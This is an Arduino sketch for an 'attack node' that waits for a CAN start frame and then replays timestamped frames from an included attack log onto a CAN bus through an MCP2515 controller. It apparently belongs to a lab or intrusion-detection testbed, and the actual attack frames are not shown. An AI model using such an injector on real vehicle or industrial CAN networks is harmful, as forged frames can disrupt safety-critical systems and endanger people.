// Attack node: injects the frames from the attack log

#include <Arduino.h>
#include <mcp2515.h>
#include <attack_log.h>

#define START_ID 0x7FE

MCP2515 mcp2515(D10);

void wait_for_start(){
	struct can_frame frame;
	while(true){
		if (mcp2515.readMessage(&frame) == MCP2515::ERROR_OK && frame.can_id == START_ID)
			return;
	}
}

void setup(){
	Serial.begin(115200);

	mcp2515.reset();
	mcp2515.setBitrate(CAN_500KBPS, MCP_8MHZ);
	mcp2515.setNormalMode();

	Serial.print(LOG_FRAME_COUNT);
	Serial.println(" attack frames loaded,");
}

void loop(){
	Serial.println("Waiting for start frame.");
	wait_for_start();

	Serial.println("Attack Started");
	uint32_t start = micros();

	for (int i = 0; i < LOG_FRAME_COUNT; i++){
		while (micros() - start < log_frames[i].time_us) {
		}

		struct can_frame frame;
		frame.can_id = log_frames[i].id;
		frame.can_dlc = log_frames[i].dlc;
		memcpy(frame.data, log_frames[i].data, 8);

		if(mcp2515.sendMessage(&frame) == MCP2515::ERROR_OK){
			// Serial.print("Sent ");
			// Serial.print(i);
			// Serial.println("th frame");
		}
	}


}
